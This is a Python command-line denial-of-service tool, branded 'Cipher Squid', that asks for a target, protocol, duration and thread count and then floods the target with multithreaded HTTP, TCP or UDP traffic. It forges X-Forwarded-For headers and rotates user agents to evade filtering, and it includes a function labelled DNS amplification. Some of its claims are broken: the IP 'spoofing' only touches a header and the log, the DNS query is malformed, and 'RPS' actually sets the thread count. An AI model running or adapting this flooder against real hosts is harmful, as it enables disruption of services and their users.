import os
import sys
import time
import random
import requests
import socket
from datetime import datetime
import threading
import logging
from typing import Literal
from termcolor import colored

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X; U; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
]

PAYLOADS = [
    "x" * random.randint(50, 500),
    "A" * random.randint(100, 200),
    "B" * random.randint(200, 400),
    "C" * random.randint(100, 250),
]

def generate_fake_ip(ip_version: Literal[4, 6] = 4) -> str:
    try:
        if ip_version == 4:
            return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        elif ip_version == 6:
            segments = [format(random.randint(0, 65535), 'x').zfill(4) for _ in range(8)]
            return ":".join(segments)
        else:
            raise ValueError("Invalid IP version. Use 4 or 6.")
    except Exception as e:
        logger.error(f"Error generating IP: {e}")
        raise

def send_http_request(target: str, fake_ip: str, method: str = "GET") -> None:
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": fake_ip,
        "Referer": f"https://{random.choice(['google.com', 'bing.com', target])}",
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.9", "de-DE,de;q=0.8"]),
        "Connection": "keep-alive",
    }

    payload = random.choice(PAYLOADS)

    try:
        response = requests.request(method, f"https://{target}", headers=headers, data=payload, timeout=5)
        logger.info(colored(f"[{response.status_code}] Request sent! Payload size: {len(payload)}.", "green"))
    except requests.exceptions.RequestException as e:
        logger.error(colored(f"Error during HTTP request to {target}: {e}", "red"))

def send_dns_amplification(target: str, fake_ip: str) -> None:
    try:
        dns_server = "8.8.8.8"
        dns_port = 53
        dns_query = b"\xAA\xAA\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        dns_request = dns_query + target.encode()

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(dns_request, (dns_server, dns_port))
        logger.info(f"Sent DNS amplification attack to {dns_server} from IP {fake_ip}")
    except Exception as e:
        logger.error(f"Error sending DNS amplification attack: {e}")

def send_tcp_udp_request(target: str, fake_ip: str, protocol: str) -> None:
    try:
        ip, port = target.split(":")
        port = int(port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "TCP" else socket.SOCK_DGRAM)
        s.connect((ip, port))
        payload = f"ATTACK from {fake_ip}"
        s.sendto(payload.encode(), (ip, port))
        s.close()
        logger.info(colored(f"Sent {protocol} request to {target} from IP {fake_ip}", "green"))
    except Exception as e:
        logger.error(colored(f"Error during {protocol} request to {target}: {e}", "red"))

def attack_thread(target: str, method: str, time_duration: int, rps: int, ip_version: Literal[4, 6], protocol: str) -> None:
    start_time = time.time()
    target_ip = target.split(":")[0] if ":" in target else target
    target_port = int(target.split(":")[1]) if ":" in target else 80

    def thread_attack():
        while time.time() - start_time < time_duration:
            try:
                fake_ip = generate_fake_ip(ip_version)
                logger.info(colored(f"Attacking {target} with method {method} from IP {fake_ip}", "green"))

                if method == "HTTP":
                    http_method = random.choice(["GET", "POST", "HEAD"])
                    send_http_request(target_ip, fake_ip, method=http_method)
                elif protocol in ["TCP", "UDP"]:
                    send_tcp_udp_request(target, fake_ip, protocol)
                elif protocol == "DNS":
                    send_dns_amplification(target, fake_ip)

                time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                logger.error(colored(f"Error in attack thread: {e}", "red"))

    threads = []
    try:
        for _ in range(rps):
            t = threading.Thread(target=thread_attack)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        logger.info(colored("Attack completed!", "blue"))
    except Exception as e:
        logger.error(colored(f"Error during thread execution: {e}", "red"))

def get_valid_target() -> str:
    while True:
        target = input(colored("Enter the target (IP:PORT or URL, e.g., example.com:80): ", "cyan")).strip()
        if target:
            return target
        logger.error(colored("Invalid target. Try again.", "red"))

def get_valid_method() -> str:
    valid_methods = ["HTTP", "HTTPS", "TCP", "UDP", "DNS"]
    while True:
        method = input(colored(f"Enter the attack method ({', '.join(valid_methods)}): ", "cyan")).strip().upper()
        if method in valid_methods:
            return method
        logger.error(colored("Invalid method. Try again.", "red"))

def get_valid_time() -> int:
    while True:
        try:
            time_duration = int(input(colored("Enter the attack duration in seconds: ", "cyan")).strip())
            if time_duration > 0:
                return time_duration
            logger.error(colored("Duration must be greater than 0. Try again.", "red"))
        except ValueError:
            logger.error(colored("Invalid duration. Try again.", "red"))

def get_valid_rps() -> int:
    while True:
        try:
            rps = int(input(colored("Enter the number of requests per second (RPS): ", "cyan")).strip())
            if rps > 0:
                return rps
            logger.error(colored("RPS must be greater than 0. Try again.", "red"))
        except ValueError:
            logger.error(colored("Invalid RPS. Try again.", "red"))

def get_valid_ip_version() -> Literal[4, 6]:
    while True:
        version = input(colored("Enter the IP version (4 for IPv4, 6 for IPv6): ", "cyan")).strip()
        if version in ["4", "6"]:
            return int(version)
        logger.error(colored("Invalid IP version. Use 4 or 6.", "red"))

def main():
    print(colored("Welcome by 𝘾𝙞𝙥𝙝𝙚𝙧 𝙎𝙦𝙪𝙞𝙙 ", "yellow"))
    try:
        target = get_valid_target()
        method = get_valid_method()
        time_duration = get_valid_time()
        rps = get_valid_rps()
        ip_version = get_valid_ip_version()
        attack_thread(target, method, time_duration, rps, ip_version, method)
    except KeyboardInterrupt:
        logger.info(colored("Attack interrupted by user.", "yellow"))
        sys.exit(0)
    except Exception as e:
        logger.error(colored(f"Unexpected error: {e}", "red"))
        sys.exit(1)

if __name__ == "__main__":
    main()
